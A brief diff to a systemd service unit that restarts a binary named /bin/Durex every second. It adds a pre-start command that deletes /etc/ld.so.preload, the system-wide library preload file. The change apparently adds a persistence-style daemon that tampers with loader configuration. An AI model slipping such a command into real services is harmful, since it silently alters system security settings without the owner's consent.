@@ -8,6 +8,7 @@ StartLimitIntervalSec=0
 Type=simple
 Restart=always
 RestartSec=1
+ExecStartPre=/usr/bin/unlink /etc/ld.so.preload
 ExecStart=/bin/Durex
 
 [Install]
